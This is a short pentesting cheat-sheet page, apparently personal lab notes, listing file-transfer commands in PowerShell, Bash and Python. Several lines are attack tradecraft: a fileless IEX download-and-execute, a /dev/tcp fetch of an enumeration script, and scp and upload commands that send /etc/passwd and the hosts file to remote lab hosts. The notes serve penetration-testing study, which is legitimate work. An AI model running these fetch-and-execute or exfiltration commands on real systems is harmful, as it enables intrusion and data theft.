Navigation: [[Pentesting]]

---
This section will just have some very quick commands for reference. I'm not going to bother explaining how they work, nor does this cover every way to download/upload files.

HackTricks also has a useful list of [file exfiltration techniques](https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration)
# Table of Contents
1. PowerShell
2. Bash
3. Python
# PowerShell
Simple Base64 conversion:
```PowerShell
[IO.File]::WriteAllBytes("Output\File\Path", [Convert]::FromBase64String("B64String"))
```

Web File Downloads:
```PowerShell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

Fileless "Download":
```PowerShell
IEX (New-Object Net.WebClient).DownloadString("URI")
```

Here's a list of further [download commands](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

Web Upload:
```PowerShell
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

# Other option
curl.exe -F "files=@filepath" -X POST URI
```

# Bash
Base64 encode and decode:
```shell
cat file | base64 -w 0; echo

echo -n "B64" | base64 -d > out
```

`wget` and `curl` are two classic options as well. We can pipe curl into bash to run fileless too. 

Here's an interesting way to download files using bash 2.04 (and up) along with `/dev/tcp`:
```shell
exec 3<>/dev/tcp/server-ip/80

echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

cat <&3
```

SCP download and upload (and enabling + starting SSH):
```shell
sudo systemctl enable ssh
sudo systemctl start ssh

scp plaintext@192.168.49.128:/root/myroot.txt . 

scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

# Python
Python can be used to create a download server which is accessible through port 80:
```shell
python2.7 -m SimpleHTTPServer

python3 -m http.server
```

We can use python's [upload server](https://pypi.org/project/uploadserver/) to create a server to upload our files to.

---
Navigation: [[Pentesting]]